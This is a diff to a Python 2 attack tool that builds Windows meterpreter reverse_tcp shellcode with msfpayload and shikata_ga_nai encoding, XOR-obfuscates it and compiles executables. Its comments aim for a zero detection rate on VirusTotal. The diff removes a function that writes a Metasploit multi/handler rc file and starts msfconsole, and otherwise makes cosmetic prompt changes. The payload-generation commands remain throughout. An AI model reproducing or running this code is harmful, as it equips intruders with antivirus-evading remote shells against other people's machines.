@@ -12,29 +12,6 @@ from itertools import izip, cycle
 # This is still a work in progress currently only shell to exe works. at a 9/43 detection rate on VirusTotal
 # Looking to incorporate pyinstaller with wine, to get 0/43 detection rate. we will figure it out.
 
-def start_listener():
-	PrintInfo("Starting multi handler")
-
-	# create rc file
-	rcfile = "output/pdf_listener.rc"
-	fw = open(rcfile, "w")
-	fw.write("use exploit/multi/handler\n")
-	fw.write("set PAYLOAD %s\n" % payload2)
-	fw.write("set LHOST 0.0.0.0\n")
-	fw.write("set LPORT %s\n" % port)
-	if not selection or selection in ('1','2'):
-		fw.write("set ExitOnSession false\n")
-		fw.write("set AutoRunScript migrate -f\n")
-	fw.write("exploit -j -z")
-	fw.close()
-
-	# start listener
-	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
-
-	PrintInfo("Cleaning up...")
-	os.remove(rcfile)
-	time.sleep(1)
-	
 def xor_string(data,key):
 	return "".join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
 	
@@ -62,7 +39,7 @@ while 1:
 		while selection != range(1,4):
 			clear()
 			menus.shellcode_menu()
-			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+			selection = raw_input("%s Selection > %s" % (colours.bold, colours.reset))
 			if selection == '1':
 				payload = "windows/meterpreter/reverse_tcp"
 				break
@@ -72,25 +49,26 @@ while 1:
 
 		# shall we encode the payload?
 		menus.win_enc_menu()
-		encoding = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+		encoding = raw_input("%s Selection > %s" % (colours.bold, colours.reset))
 
 		#			
 		# get some user info
-		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
+		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
 		if ip == '':
 			ip = iface
-		port = raw_input("Enter a port (default 8080): ")
+		port = raw_input(" Enter a port (default 8080): ")
 		if port == '':
 			port = 8080
 		if encoding == '1' or encoding == '':
 			encoding = '1'
-			iterations = raw_input("Number of times to encode shellcode (default 10): ")
+			iterations = raw_input(" Number of times to encode shellcode (default 10): ")
 			if iterations == '':
 				iterations = 10
 
 		# create payload
 		if encoding == '1':
 			PrintInfo("Creating payload with x%s shikata_ga_nai. Please wait..." % iterations)
+			print ""
 			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" % (path, payload, ip, port, path, iterations)).read()
 			PrintInfo("Shellcode generated")
 			sleep(1)
@@ -98,6 +76,7 @@ while 1:
 			sleep(1)
 		elif encoding == '2':
 			PrintInfo("Creating payload. Please wait...")
+			print ""
 			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s C " % (path, payload, ip, port)).read()
 			PrintInfo("Shellcode generated")
 			sleep(1)
@@ -130,7 +109,7 @@ while 1:
 			
 		# clean up
 		PrintInfo("Cleaning up...")
-		os.remove('output/template.c')
+		os.remove("output/template.c")
 			
 		# return to main
 		EntContinue()
